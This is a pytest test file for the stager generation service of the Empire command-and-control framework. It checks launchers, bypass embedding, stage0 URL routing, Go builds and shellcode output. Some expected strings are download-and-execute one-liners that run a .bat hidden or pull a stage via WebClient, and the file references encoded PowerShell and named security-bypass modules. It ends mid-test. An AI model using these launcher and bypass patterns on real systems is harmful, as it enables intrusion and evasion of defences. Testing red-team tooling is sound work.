import base64
import concurrent.futures
import logging
import platform
import re
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from sqlalchemy import delete

from empire.server.common import packets
from empire.server.common.empire import MainMenu
from empire.server.core.db import models
from empire.server.core.db.base import SessionLocal
from empire.server.core.dotnet import DotnetCompiler
from empire.server.core.exceptions import (
    ModuleExecutionException,
    ModuleValidationException,
    StagerGenerationException,
)
from empire.server.core.stager_generation_service import (
    StagerGenerationService,
    _resolve_arch,
)
from empire.server.stagers.multi.generate_agent import Stager
from empire.server.stagers.multi.launcher import Stager as MultiLauncherStager
from empire.server.stagers.windows.launcher_bat import Stager as LauncherBatStager
from empire.server.utils.donut_util import donut_create
from empire.server.utils.file_util import run_as_user

_MIN_GO_BUILD_ARGS = 2

is_arm = platform.machine().startswith("arm") or platform.machine().startswith(
    "aarch64"
)


@pytest.fixture(scope="module")
def stager_generation_service(main: MainMenu):
    return main.stagergenv2


@pytest.fixture(scope="module")
def compiled_dotnet_exe(stager_generation_service):
    """Compile each (kind, .NET version) EXE once and cache the path.

    The ``*_shellcode`` tests differ only by donut arch — the .NET compile is
    arch-independent, only the donut step varies by arch — so compiling the
    identical EXE once per version (instead of once per (arch, version) combo)
    removes the redundant EmpireCompiler runs that dominated this file. The
    per-version/confuse compile coverage lives in the ``*_exe`` tests and the
    full ``generate_*_shellcode`` method coverage in the ``*_shellcode_e2e``
    tests.
    """
    cache = {}

    def _get(kind, dot_net_version):
        key = (kind, dot_net_version)
        if key not in cache:
            if kind == "powershell":
                cache[key] = stager_generation_service.generate_powershell_exe(
                    "posh_code", dot_net_version
                )
            elif kind == "python":
                cache[key] = stager_generation_service.generate_python_exe(
                    "python_code", dot_net_version
                )
        return cache[key]

    return _get


def test_write_unique_launcher_reports_unavailable_compiler_clearly(
    tmp_path, monkeypatch
):
    """With the compiler missing (cold cache + offline at boot), a C# stager
    request must fail with the "not available" message that stager_service
    turns into a 400 -- not a TypeError from `None / "Data/..."`."""
    monkeypatch.setattr(
        "empire.server.core.dotnet.sync_empire_compiler", lambda *_a, **_k: None
    )
    service = StagerGenerationService.__new__(StagerGenerationService)
    service.dotnet_compiler = DotnetCompiler(install_path=tmp_path)

    with pytest.raises(ModuleExecutionException, match="not available"):
        service._write_unique_launcher("code")


def test_compiler(main, empire_config):
    dotnet_compiler = main.dotnet_compiler
    compiler_dir = dotnet_compiler.compiler_dir
    compiler_path = compiler_dir / "EmpireCompiler"

    assert compiler_path.is_file(), f"EmpireCompiler binary not found at {compiler_dir}"

    result = run_as_user([str(compiler_path), "--help"], text=True, capture_output=True)
    assert "Usage:" in result, "Unexpected output from EmpireCompiler --help"


def test_generate_launcher_fetcher(stager_generation_service):
    launcher = stager_generation_service.generate_launcher_fetcher(encode=False)

    assert (
        launcher
        == 'wget "http://127.0.0.1/launcher.bat" -outfile "launcher.bat"; Start-Process -FilePath .\\launcher.bat -Wait -passthru -WindowStyle Hidden;'
    )


def test_generate_launcher(stager_generation_service):
    pass


@pytest.mark.parametrize(
    ("method", "language"),
    [
        ("generate_python_stageless", "python"),
        ("generate_powershell_stageless", "powershell"),
    ],
)
def test_stageless_raises_when_generate_stager_returns_none(method, language):
    """A listener whose generate_stager() returns None (e.g. a port_forward_pivot
    with an inactive/keyless parent) must yield a clean StagerGenerationException
    — which stager_service turns into a 400 — not an opaque AttributeError from
    the downstream .replace()/join(). The functions don't touch self, so a mock
    self is fine."""
    active_listener = MagicMock()
    active_listener.options = {"Name": {"Value": "pivot1"}}
    active_listener.host_address = "http://127.0.0.1/"
    active_listener.info = {"Name": "port_forward_pivot"}
    active_listener.generate_agent.return_value = "agent"
    active_listener.generate_comms.return_value = "comms"
    active_listener.generate_stager.return_value = None

    with pytest.raises(StagerGenerationException, match="stager"):
        getattr(StagerGenerationService, method)(MagicMock(), active_listener, language)


def test_generate_launcher_embeds_safechecks_ps_bypass(stager_generation_service):
    marker_a = "Expect100Continue=0"
    marker_b = "PSVersionTable.PSVersion.Major -lt 3"

    baseline = stager_generation_service.generate_launcher(
        listener_name="new-listener-1",
        language="powershell",
        encode=False,
        bypasses="",
    )
    assert baseline is not None
    assert marker_a not in baseline
    assert marker_b not in baseline

    launcher = stager_generation_service.generate_launcher(
        listener_name="new-listener-1",
        language="powershell",
        encode=False,
        bypasses="SafeChecksPS",
    )
    assert launcher is not None
    assert marker_a in launcher
    assert marker_b in launcher


def test_generate_launcher_embeds_safechecks_python_bypass(stager_generation_service):
    marker = "Little Snitch"

    baseline = stager_generation_service.generate_launcher(
        listener_name="new-listener-1",
        language="python",
        encode=False,
        bypasses="",
    )
    assert baseline is not None
    assert marker not in baseline

    launcher = stager_generation_service.generate_launcher(
        listener_name="new-listener-1",
        language="python",
        encode=False,
        bypasses="SafeChecksPython",
    )
    assert launcher is not None
    assert marker in launcher
    assert "subprocess.Popen" in launcher


def test_generate_launcher_filters_bypass_by_language(
    stager_generation_service, main, caplog
):
    """A powershell bypass must be skipped when generating a python launcher,
    and the language mismatch must be logged at WARNING level."""
    with SessionLocal.begin() as db:
        ps_bypass = main.bypassesv2.get_by_name(db, "mattifestation")
        assert ps_bypass is not None
        assert ps_bypass.language == "powershell"
        ps_bypass_code = ps_bypass.code

    with caplog.at_level(logging.WARNING):
        launcher = stager_generation_service.generate_launcher(
            listener_name="new-listener-1",
            language="python",
            encode=False,
            bypasses="mattifestation",
        )

    assert launcher is not None
    assert ps_bypass_code not in launcher
    matching = [
        r
        for r in caplog.records
        if "Dropping bypass" in r.message and r.levelname == "WARNING"
    ]
    assert matching, "Expected WARNING-level language-mismatch log was not emitted"


@pytest.mark.parametrize(
    ("obfuscate", "encode"),
    [
        (False, False),
        (False, True),
    ],
)
def test_generate_exe_oneliner(stager_generation_service, obfuscate, encode):
    launcher = stager_generation_service.generate_exe_oneliner(
        language="powershell",
        obfuscate=obfuscate,
        obfuscation_command="",
        encode=encode,
        listener_name="new-listener-1",
    )

    listener = stager_generation_service.listener_service.get_active_listener_by_name(
        "new-listener-1"
    )
    cookie_name = listener.options["Cookie"]["Value"]
    staging_key = listener.options["StagingKey"]["Value"]

    def decoded_powershell_if_needed(text: str) -> str:
        m = re.search(r"-enc\s+([A-Za-z0-9+/=]+)", text)
        if not m:
            return text
        raw = base64.b64decode(m.group(1))
        return raw.decode("utf-16le", errors="strict")

    ps = decoded_powershell_if_needed(launcher)

    # Invariants: the launcher should set the Cookie and download stage0
    assert "System.Net.WebClient" in ps
    assert 'Headers.Add("Cookie",' in ps
    assert "DownloadData(" in ps

    # Extract the cookie header value:  Cookie","<cookie_name>=<base64_routing_packet>"
    cookie_re = re.compile(
        r'Headers\.Add\("Cookie","' + re.escape(cookie_name) + r"=([^\";]+)\"\)"
    )
    m = cookie_re.search(ps)
    assert m, f"Cookie header not found or not in expected format. Script was: {ps}"

    b64_routing_packet = m.group(1)

    # Base64 must decode, and routing packet must be the expected invariant size here (encData is "")
    routing_packet = base64.b64decode(b64_routing_packet, validate=True)
    assert len(routing_packet) == 44  # noqa: PLR2004 12-byte IV + 32-byte AES-256-GCM blob

    # Decrypt + parse routing packet and validate invariant fields
    parsed = packets.parse_routing_packet(staging_key, routing_packet)
    assert parsed is not None
    assert "00000000" in parsed

    language, meta, additional, enc_data = parsed["00000000"]
    assert language == "POWERSHELL"
    assert meta == "STAGE0"
    assert additional == "NONE"
    assert enc_data == b""


def test_load_bypass_codes_case_insensitive_language_match(
    stager_generation_service, main
):
    """A bypass record stored with mixed-case language must match a lowercase
    request, so latent case drift in the YAML/DB doesn't silently hide bypasses."""
    with SessionLocal.begin() as db:
        original = main.bypassesv2.get_by_name(db, "mattifestation")
        assert original is not None
        original_language = original.language
        original.language = "PowerShell"

    try:
        codes = stager_generation_service._load_bypass_codes(
            "mattifestation", "powershell"
        )
        assert len(codes) == 1
        assert codes[0]
    finally:
        with SessionLocal.begin() as db:
            restored = main.bypassesv2.get_by_name(db, "mattifestation")
            restored.language = original_language


def test_generate_exe_oneliner_embeds_ps_bypass(stager_generation_service):
    """Routed and non-routed PS-wrapping oneliners must accept PS bypasses, since
    they execute as a PowerShell command regardless of payload language."""
    marker_a = "Expect100Continue=0"
    marker_b = "PSVersionTable.PSVersion.Major -lt 3"

    baseline = stager_generation_service.generate_exe_oneliner(
        language="csharp",
        obfuscate=False,
        obfuscation_command="",
        encode=False,
        listener_name="new-listener-1",
        bypasses="",
    )
    assert baseline is not None
    assert marker_a not in baseline

    with_bypass = stager_generation_service.generate_exe_oneliner(
        language="csharp",
        obfuscate=False,
        obfuscation_command="",
        encode=False,
        listener_name="new-listener-1",
        bypasses="SafeChecksPS",
    )
    assert with_bypass is not None
    assert marker_a in with_bypass
    assert marker_b in with_bypass

    routed = stager_generation_service.generate_exe_oneliner_routed(
        language="csharp",
        obfuscate=False,
        obfuscation_command="",
        encode=False,
        listener_name="new-listener-1",
        bypasses="SafeChecksPS",
    )
    assert routed is not None
    assert marker_a in routed


def test_generate_go_exe_oneliner_routed_embeds_ps_bypass(stager_generation_service):
    """The routed Go oneliner emits a PowerShell downloader, so it must embed
    selected PowerShell bypasses (pins the bypass_prefix in
    generate_go_exe_oneliner_routed, the one routed branch the csharp test above
    doesn't cover)."""
    marker = "Expect100Continue=0"

    baseline = stager_generation_service.generate_go_exe_oneliner_routed(
        language="go",
        listener_name="new-listener-1",
        obfuscate=False,
        obfuscation_command="",
        encode=False,
        bypasses="",
    )
    assert baseline is not None
    assert marker not in baseline

    with_bypass = stager_generation_service.generate_go_exe_oneliner_routed(
        language="go",
        listener_name="new-listener-1",
        obfuscate=False,
        obfuscation_command="",
        encode=False,
        bypasses="SafeChecksPS",
    )
    assert with_bypass is not None
    assert marker in with_bypass


@pytest.mark.parametrize(
    ("obfuscate", "encode"),
    [
        (True, False),
        (True, True),
    ],
)
@pytest.mark.slow
def test_obfuscate_generate_exe_oneliner(stager_generation_service, obfuscate, encode):
    launcher = stager_generation_service.generate_exe_oneliner(
        language="powershell",
        obfuscate=obfuscate,
        obfuscation_command="Token\\ALL\\1",
        encode=encode,
        listener_name="new-listener-1",
    )
    assert launcher is not None


def test_generate_dll(stager_generation_service):
    dll_bytes = stager_generation_service.generate_dll("posh_code", "x64")
    assert len(dll_bytes) == 665088  # noqa: PLR2004


@pytest.mark.parametrize(
    ("dot_net_version", "obfuscate"),
    [
        ("net40", False),
        ("net35", False),
        ("net40", True),
        ("net35", True),
    ],
)
@pytest.mark.slow
def test_generate_powershell_exe(stager_generation_service, dot_net_version, obfuscate):
    result = stager_generation_service.generate_powershell_exe(
        "posh_code", dot_net_version, obfuscate
    )

    assert result is not None
    assert result.exists(), f"Generated file not found: {result}"


@pytest.mark.skipif(is_arm, reason="Skipping test on ARM architecture")
@pytest.mark.parametrize(
    ("arch", "dot_net_version"),
    [
        ("x86", "net40"),
        ("x64", "net40"),
        ("both", "net40"),
        ("x86", "net35"),
        ("x64", "net35"),
        ("both", "net35"),
    ],
)
def test_generate_powershell_shellcode(compiled_dotnet_exe, arch, dot_net_version):
    # Compile-once: the EXE is cached per .NET version; only donut varies by arch
    # (this mirrors generate_powershell_shellcode, which compiles then donuts).
    exe = compiled_dotnet_exe("powershell", dot_net_version)
    shellcode = donut_create(file=str(exe), arch=_resolve_arch(arch))

    assert isinstance(shellcode, bytes), (
        f"Shellcode should be bytes, but got {type(shellcode)}"
    )
    assert (
        len(shellcode) > 100  # noqa: PLR2004
    ), f"Shellcode is too short: {len(shellcode)} bytes"
    assert shellcode.startswith(b"\xe8"), (
        "Shellcode does not start with the expected byte"
    )
    assert re.search(rb"\x00\x00\x00\x00", shellcode), (
        "Expected byte sequence not found in shellcode"
    )


@pytest.mark.skipif(is_arm, reason="Skipping test on ARM architecture")
def test_generate_powershell_shellcode_e2e(stager_generation_service):
    # Full method coverage (compile + donut) exercised once; the parametrized
    # test above covers the per-arch donut behavior on a cached compile.
    shellcode, err = stager_generation_service.generate_powershell_shellcode(
        "posh_code", "x64", "net40"
    )
    assert err is None, f"Error occurred: {err}"
    assert isinstance(shellcode, bytes)
    assert len(shellcode) > 100  # noqa: PLR2004


@pytest.mark.parametrize(
    ("dot_net_version", "obfuscate"),
    [
        ("net40", False),
        ("net40", True),
    ],
)
@pytest.mark.slow
def test_generate_python_exe(stager_generation_service, dot_net_version, obfuscate):
    result = stager_generation_service.generate_python_exe(
        "python_code", dot_net_version, obfuscate
    )

    assert result is not None
    assert result.exists(), f"Generated file not found: {result}"


def _extract_launcher_locations(yaml_strs: list[str]) -> list[str]:
    """Return all patched launcher.txt Location values from a list of YAML strings.

    Filters by basename so CSharpPy.yaml's dozen other Location entries
    (DLLs, Lib.zip) don't pollute the result.
    """
    locations = []
    for yaml_str in yaml_strs:
        for raw in re.findall(r"Location:\s*(.+)", yaml_str):
            loc = raw.strip()
            if loc.replace("\\", "/").endswith("/launcher.txt"):
                locations.append(loc)
    return locations


def _assert_unique_launcher_locations(
    captured_yamls: list[str], compiler_dir: Path, n_calls: int
) -> None:
    """Assert isolation invariants shared by powershell and python exe tests."""
    assert len(captured_yamls) == n_calls
    locations = _extract_launcher_locations(captured_yamls)
    assert len(locations) == n_calls, (
        f"Expected {n_calls} launcher Location entries, got: {locations}"
    )
    assert len(set(locations)) == n_calls, f"Duplicate launcher paths: {locations}"
    # common_dir is shared with real-compile tests via the compiler cache, so
    # scope cleanup checks to this call's own temp dir rather than asserting the
    # whole directory has no subdirs (which is racy under parallel test runs).
    common_dir = compiler_dir / "Data/EmbeddedResources/common"
    for loc in locations:
        norm = loc.replace("\\", "/")
        assert norm.startswith("common/"), f"Location not under common/: {loc!r}"
        assert norm.endswith("/launcher.txt"), (
            f"Basename changed from launcher.txt: {loc!r}"
        )
        unique_name = norm.split("/")[-2]
        assert not (common_dir / unique_name).exists(), (
            f"Temp launcher dir not cleaned up: {unique_name}"
        )


@pytest.mark.parametrize(
    "method_name", ["generate_powershell_exe", "generate_python_exe"]
)
def test_exe_launcher_isolation(stager_generation_service, method_name):
    """Concurrent calls each write to a unique temp subdirectory, preventing
    cross-contamination of launcher content."""
    n_calls = 2
    captured_yamls = []

    def fake_compile(yaml_str, *args, **kwargs):
        captured_yamls.append(yaml_str)
        return Path("/tmp/fake.exe")

    compiler_dir = stager_generation_service.dotnet_compiler.compiler_dir
    method = getattr(stager_generation_service, method_name)

    with (
        patch.object(
            stager_generation_service.dotnet_compiler,
            "compile_stager",
            side_effect=fake_compile,
        ),
        concurrent.futures.ThreadPoolExecutor(max_workers=n_calls) as executor,
    ):
        futures = [executor.submit(method, f"code_{i}") for i in range(n_calls)]
        for f in futures:
            f.result()

    _assert_unique_launcher_locations(captured_yamls, compiler_dir, n_calls)


@pytest.mark.parametrize(
    "method_name", ["generate_powershell_exe", "generate_python_exe"]
)
def test_exe_launcher_cleanup_on_failure(stager_generation_service, method_name):
    """The unique launcher dir is removed even when compile_stager raises."""
    compiler_dir = stager_generation_service.dotnet_compiler.compiler_dir
    common_dir = compiler_dir / "Data/EmbeddedResources/common"
    captured_yamls = []

    def failing_compile(yaml_str, *args, **kwargs):
        captured_yamls.append(yaml_str)
        raise RuntimeError("simulated compile failure")

    with (
        patch.object(
            stager_generation_service.dotnet_compiler,
            "compile_stager",
            side_effect=failing_compile,
        ),
        pytest.raises(RuntimeError, match="simulated compile failure"),
    ):
        getattr(stager_generation_service, method_name)("some_code")

    # Scope to this compilation's own temp dir; common_dir is shared with
    # real-compile tests via the compiler cache, so a bare before/after diff is
    # racy under parallel test runs.
    locations = _extract_launcher_locations(captured_yamls)
    assert len(locations) == 1, f"Expected one patched launcher Location: {locations}"
    unique_name = locations[0].replace("\\", "/").split("/")[-2]
    assert not (common_dir / unique_name).exists(), (
        f"Temp launcher dir leaked after compile failure: {unique_name}"
    )


def test_patch_launcher_yaml_raises_when_placeholder_absent():
    """_patch_launcher_yaml raises RuntimeError if the YAML lacks the expected placeholder."""
    with pytest.raises(RuntimeError, match="YAML patch failed"):
        StagerGenerationService._patch_launcher_yaml(
            "no placeholder here", Path("common/abc")
        )


@pytest.mark.skipif(is_arm, reason="Skipping test on ARM architecture")
@pytest.mark.parametrize(
    ("arch", "dot_net_version"),
    [
        ("x86", "net40"),
        ("x64", "net40"),
        ("both", "net40"),
    ],
)
def test_generate_python_shellcode(compiled_dotnet_exe, arch, dot_net_version):
    # Compile-once: the EXE is cached per .NET version; only donut varies by arch.
    exe = compiled_dotnet_exe("python", dot_net_version)
    shellcode = donut_create(file=str(exe), arch=_resolve_arch(arch))

    assert shellcode is not None, "Shellcode was not generated"
    assert isinstance(shellcode, bytes), "Generated shellcode is not in bytes format"
    assert len(shellcode) > 0, "Generated shellcode is empty"


@pytest.mark.skipif(is_arm, reason="Skipping test on ARM architecture")
def test_generate_python_shellcode_e2e(stager_generation_service):
    # Full method coverage (compile + donut) exercised once.
    shellcode, err = stager_generation_service.generate_python_shellcode(
        "python_code", "x64", "net40"
    )
    assert err is None, f"Unexpected error: {err}"
    assert isinstance(shellcode, bytes)
    assert len(shellcode) > 0


@pytest.mark.slow
def test_generate_go_stageless(stager_generation_service, tmp_path):
    """
    Test the generate_go_stageless function using a real listener (new-listener-1).
    Asserts the regex against the renderer's returned string instead of a
    global on-disk path.
    """
    install_path = stager_generation_service.main_menu.install_path
    static_main_go = install_path / "data/agent/gopire/main.go"
    assert not static_main_go.exists(), (
        f"test pollution: stale main.go in canonical install tree at {static_main_go}"
    )

    active_listener = (
        stager_generation_service.listener_service.get_active_listener_by_name(
            "new-listener-1"
        )
    )
    template_vars = stager_generation_service._build_template_vars(active_listener)

    compiler = stager_generation_service.main_menu.go_compiler
    rendered = compiler.generate_main_go(
        "main.template", str(tmp_path / "main.go"), template_vars
    )

    staging_key_base64_match = re.search(r'stagingKeyBase64\s*:=\s*"([^"]+)"', rendered)
    assert staging_key_base64_match, "stagingKeyBase64 not found in rendered main.go"

    staging_key = active_listener.options["StagingKey"]["Value"]
    expected_staging_key_base64 = base64.b64encode(staging_key.encode("UTF-8")).decode(
        "UTF-8"
    )
    assert staging_key_base64_match.group(1) == expected_staging_key_base64, (
        f"StagingKeyBase64 mismatch: expected {expected_staging_key_base64}, "
        f"got {staging_key_base64_match.group(1)}"
    )

    options = {"Listener": {"Value": "new-listener-1"}}
    result = stager_generation_service.generate_go_stageless(options)

    assert result is not None, "Stager generation failed, result is None."
    assert Path(result).exists(), f"Generated executable not found: {result}"
    assert Path(result).stat().st_size > 0, f"Generated executable is empty: {result}"


@pytest.mark.slow
def test_compile_stager_concurrent_isolation(stager_generation_service):
    """
    Concurrent compile_stager calls each produce a binary with their own
    staging key embedded — i.e. no cross-contamination from another in-flight
    build's main.go. This exercises the actual race the static-path fix targets:
    sequential calls would have passed under the buggy pre-fix code too because
    each call ran to completion before the next one started.
    """
    install_path = stager_generation_service.main_menu.install_path
    static_main_go = install_path / "data/agent/gopire/main.go"
    assert not static_main_go.exists(), (
        f"test pollution: stale main.go in canonical install tree at {static_main_go}"
    )

    active_listener = (
        stager_generation_service.listener_service.get_active_listener_by_name(
            "new-listener-1"
        )
    )
    base_template_vars = stager_generation_service._build_template_vars(active_listener)

    keys = [
        "AAAAAAAAAAAAAAAAAAAAAA==",
        "QkJCQkJCQkJCQkJCQkJCQkI=",
        "Q0NDQ0NDQ0NDQ0NDQ0NDQ0M=",
        "RERERERERERERERERERERFE=",
    ]
    template_vars_list = [{**base_template_vars, "STAGING_KEY": k} for k in keys]

    compiler = stager_generation_service.main_menu.go_compiler
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(keys)) as executor:
        futures = [
            executor.submit(compiler.compile_stager, tv, "stager", "windows", "amd64")
            for tv in template_vars_list
        ]
        binaries = [f.result() for f in futures]

    assert len(set(binaries)) == len(binaries), (
        f"compile_stager returned duplicate paths under concurrent calls: {binaries}"
    )

    for tv, binary_path in zip(template_vars_list, binaries, strict=True):
        assert Path(binary_path).exists(), f"Binary missing: {binary_path}"
        binary_bytes = Path(binary_path).read_bytes()
        expected = tv["STAGING_KEY"].encode("ascii")
        assert expected in binary_bytes, (
            f"Binary {binary_path} does not contain its expected staging key "
            f"{tv['STAGING_KEY']!r} — likely cross-contamination from another "
            f"concurrent compile_stager call"
        )

    assert not static_main_go.exists(), (
        f"compile_stager should not write main.go into the canonical install "
        f"tree, but it exists at {static_main_go}"
    )


@pytest.mark.slow
def test_compile_stager_preserves_main_go_on_build_failure(
    stager_generation_service, monkeypatch
):
    """
    When ``go build`` fails, the rendered main.go is preserved to a stable
    temp file referenced in the exception message and survives
    ``TemporaryDirectory`` cleanup so operators can inspect it post-mortem.
    """
    active_listener = (
        stager_generation_service.listener_service.get_active_listener_by_name(
            "new-listener-1"
        )
    )
    template_vars = stager_generation_service._build_template_vars(active_listener)
    compiler = stager_generation_service.main_menu.go_compiler

    real_run = subprocess.run

    def fake_run(args, **kwargs):
        if (
            isinstance(args, list)
            and len(args) >= _MIN_GO_BUILD_ARGS
            and args[1] == "build"
        ):
            return subprocess.CompletedProcess(
                args=args, returncode=1, stdout="", stderr="forced build failure"
            )
        return real_run(args, **kwargs)

    monkeypatch.setattr("empire.server.core.go.subprocess.run", fake_run)

    with pytest.raises(ModuleExecutionException) as exc_info:
        compiler.compile_stager(template_vars, "stager", goos="windows", goarch="amd64")

    msg = str(exc_info.value)
    assert "forced build failure" in msg, f"build error must reach caller, got: {msg}"

    match = re.search(r"preserved at (\S+\.go)", msg)
    assert match, f"preserved path missing from exception message: {msg}"

    preserved = Path(match.group(1))
    try:
        assert preserved.exists(), f"preserved main.go does not exist: {preserved}"
        content = preserved.read_text()
        assert "stagingKeyBase64" in content, (
            "preserved file must contain rendered template content"
        )
    finally:
        preserved.unlink(missing_ok=True)


@pytest.mark.slow
def test_compile_stager_build_error_propagates_when_preservation_fails(
    stager_generation_service, monkeypatch
):
    """
    If preservation of the failed main.go itself fails (e.g. ENOSPC on /tmp),
    the original ``go build`` error must still reach the caller — preservation
    is a debugging aid and must never displace the real failure.
    """
    active_listener = (
        stager_generation_service.listener_service.get_active_listener_by_name(
            "new-listener-1"
        )
    )
    template_vars = stager_generation_service._build_template_vars(active_listener)
    compiler = stager_generation_service.main_menu.go_compiler

    real_run = subprocess.run

    def fake_run(args, **kwargs):
        if (
            isinstance(args, list)
            and len(args) >= _MIN_GO_BUILD_ARGS
            and args[1] == "build"
        ):
            return subprocess.CompletedProcess(
                args=args, returncode=1, stdout="", stderr="forced build failure"
            )
        return real_run(args, **kwargs)

    def failing_mkstemp(*args, **kwargs):
        raise OSError(28, "No space left on device")

    monkeypatch.setattr("empire.server.core.go.subprocess.run", fake_run)
    monkeypatch.setattr("empire.server.core.go.tempfile.mkstemp", failing_mkstemp)

    with pytest.raises(ModuleExecutionException) as exc_info:
        compiler.compile_stager(template_vars, "stager", goos="windows", goarch="amd64")

    msg = str(exc_info.value)
    assert "forced build failure" in msg, (
        f"original build error must survive preservation failure, got: {msg}"
    )
    assert "failed to preserve" in msg, (
        f"failure-to-preserve note expected in message, got: {msg}"
    )


def test_build_template_vars(stager_generation_service):
    """`_build_template_vars` returns the same dict generate_go_stageless used to construct inline."""
    active_listener = (
        stager_generation_service.listener_service.get_active_listener_by_name(
            "new-listener-1"
        )
    )

    template_vars = stager_generation_service._build_template_vars(active_listener)

    expected_keys = {
        "PROFILE",
        "MALLEABLE",
        "MALLEABLE_PROFILE",
        "HOST",
        "SESSION_ID",
        "KILL_DATE",
        "WORKING_HOURS",
        "DELAY",
        "JITTER",
        "LOST_LIMIT",
        "SESSION_COOKIE",
        "STAGING_KEY",
        "DEFAULT_RESPONSE",
        "AGENT_PRIVATE_CERT_KEY",
        "AGENT_PUBLIC_CERT_KEY",
        "SERVER_PUBLIC_CERT_KEY",
    }
    assert set(template_vars.keys()) == expected_keys
    assert template_vars["HOST"] == active_listener.host_address
    assert template_vars["SESSION_ID"] == "00000000"

    expected_staging_key = base64.b64encode(
        active_listener.options["StagingKey"]["Value"].encode("UTF-8")
    ).decode("UTF-8")
    assert template_vars["STAGING_KEY"] == expected_staging_key


@pytest.mark.slow
def test_generate_main_go_returns_rendered_string(stager_generation_service, tmp_path):
    """generate_main_go returns the rendered string in addition to writing it."""
    active_listener = (
        stager_generation_service.listener_service.get_active_listener_by_name(
            "new-listener-1"
        )
    )
    template_vars = stager_generation_service._build_template_vars(active_listener)

    compiler = stager_generation_service.main_menu.go_compiler
    output_path = tmp_path / "main.go"

    rendered = compiler.generate_main_go(
        "main.template", str(output_path), template_vars
    )

    assert isinstance(rendered, str), "generate_main_go must return the rendered string"
    assert rendered == output_path.read_text(), (
        "Returned string must match the bytes written to disk"
    )
    assert "stagingKeyBase64" in rendered, "Render did not produce expected content"


@pytest.mark.parametrize(
    ("language", "listener_name", "obfuscate", "encode", "expected_partial_launcher"),
    [
        (
            "go",
            "new-listener-1",
            False,
            False,
            r'\$tempFilePath = \[System.IO.Path\]::Combine\(\[System.IO.Path\]::GetTempPath\(\), "[\w\d]+\.exe"\);',
        ),
        (
            "go",
            "new-listener-1",
            True,
            False,
            None,
        ),
        (
            "go",
            "new-listener-1",
            False,
            True,
            None,
        ),
    ],
)
def test_generate_go_exe_oneliner(
    stager_generation_service,
    language,
    listener_name,
    obfuscate,
    encode,
    expected_partial_launcher,
):
    launcher = stager_generation_service.generate_go_exe_oneliner(
        language=language,
        listener_name=listener_name,
        obfuscate=obfuscate,
        obfuscation_command="Token\\ALL\\1" if obfuscate else "",
        encode=encode,
    )

    assert launcher is not None, "Launcher generation failed, result is None."

    if not obfuscate and not encode:
        assert re.search(expected_partial_launcher, launcher), (
            f"Launcher does not contain expected content: {launcher}"
        )

    if obfuscate or encode:
        # Check if launcher is a string
        assert isinstance(launcher, str), (
            f"Expected launcher to be a string, but got {type(launcher)}."
        )

        # Check if launcher has a non-zero length
        assert len(launcher) > 0, "Launcher is empty; expected non-empty string."

    if encode:
        assert re.match(
            r"powershell -noP -sta -w 1 -enc\s+[A-Za-z0-9+/=]+",
            launcher,
        ), f"Encoded launcher does not match expected structure: {launcher}"


def test_stage0_url_for_raises_on_unsupported_listener_type(
    stager_generation_service,
):
    """The sweep that removed the per-site allow-list at 13 call sites
    must surface the same user-visible error from a centralized check —
    otherwise listeners like `HTTP[S] Hop` and `Template` (which have
    DefaultProfile + host_address but no real csharp/go stager support)
    silently produce launchers that download nothing. Pre-sweep each
    site emitted `log.error(...)` + `return ""` (or raised
    ModuleValidationException). Post-sweep, that error MUST come from
    `_stage0_url_for` so the surface stays consistent.
    """
    fake_hop = MagicMock()
    fake_hop.info = {"Name": "HTTP[S] Hop"}

    with pytest.raises(ModuleValidationException, match=r"HTTP\[S\] Hop"):
        stager_generation_service._stage0_url_for(fake_hop, hop="")


@pytest.mark.parametrize(
    "listener_name",
    ["HTTP[S]", "smb_pivot", "port_forward_pivot"],
)
def test_stage0_url_for_accepts_legacy_listener_types(
    stager_generation_service, listener_name
):
    """The three legacy listener types in the pre-sweep allow-list must
    still produce a working stage 0 URL through the routed helper. Pinned
    here because the sweep removed the only previous coverage of
    `smb_pivot` / `port_forward_pivot` — those branches used to short-
    circuit the allow-list gate at every call site, but now flow through
    `_stage0_url_for` and exercise `_get_request_uri` + `_build_stage0_url`
    for the first time.
    """
    fake = MagicMock()
    fake.info = {"Name": listener_name}
    fake.host_address = "http://example.test/"
    fake.options = {"DefaultProfile": {"Value": "/foo,/bar|Mozilla/5.0"}}
    # Explicitly NO stager_url attr — forces the legacy DefaultProfile branch.
    del fake.stager_url

    url = stager_generation_service._stage0_url_for(fake, hop="")

    assert url.startswith("http://example.test/"), f"unexpected url: {url!r}"
    assert any(part in url for part in ("/foo", "/bar")), (
        f"expected one of the DefaultProfile URIs to be embedded: {url!r}"
    )


@pytest.mark.parametrize(
    ("listener_name", "must_contain_uri_substr", "must_not_contain_uri_substr"),
    [
        # Legacy HTTP listener — DefaultProfile carries the configured URI,
        # routing helper must delegate to generate_exe_oneliner unchanged.
        ("new-listener-1", None, None),
        # Malleable listener — must hit the stager URI (the amazon profile's
        # http-stager block falls back to the default "/init/"), NOT the post
        # URI "/N4215/adj/amzn.us.sr.aps" or the get URI's "field-keywords".
        ("malleable_listener_1", "/init/", "N4215"),
    ],
)
def test_generate_exe_oneliner_routed_picks_stager_uri_for_malleable(
    stager_generation_service,
    listener_name,
    must_contain_uri_substr,
    must_not_contain_uri_substr,
):
    """The routed wrapper must produce a valid oneliner for both legacy
    HTTP and malleable listeners. For malleable, the embedded download
    URL must hit the stager URI so stage 0 reaches the listener's stager
    dispatch (which serves the SharpireMalleable binary), not the POST
    handler that would otherwise receive the request.
    """
    launcher = stager_generation_service.generate_exe_oneliner_routed(
        language="powershell",
        obfuscate=False,
        obfuscation_command="",
        encode=False,
        listener_name=listener_name,
    )

    assert launcher, f"empty launcher for {listener_name}"
    assert "System.Net.WebClient" in launcher
    assert "DownloadData(" in launcher

    if must_contain_uri_substr is not None:
        assert must_contain_uri_substr in launcher, (
            f"expected {must_contain_uri_substr!r} in malleable launcher, got: {launcher}"
        )
    if must_not_contain_uri_substr is not None:
        assert must_not_contain_uri_substr not in launcher, (
            f"unexpected {must_not_contain_uri_substr!r} (post/get URI) leaked "
            f"into malleable launcher: {launcher}"
        )


@pytest.mark.parametrize(
    ("listener_name", "must_contain_uri_substr", "must_not_contain_uri_substr"),
    [
        ("new-listener-1", None, None),
        ("malleable_listener_1", "/init/", "N4215"),
    ],
)
def test_generate_go_exe_oneliner_routed_picks_stager_uri_for_malleable(
    stager_generation_service,
    listener_name,
    must_contain_uri_substr,
    must_not_contain_uri_substr,
):
    """Mirror of the C# routed test for the Go path. The PowerShell wrapper
    downloads a Go exe to disk and runs it — for malleable, the URL must
    still hit the stager dispatch."""
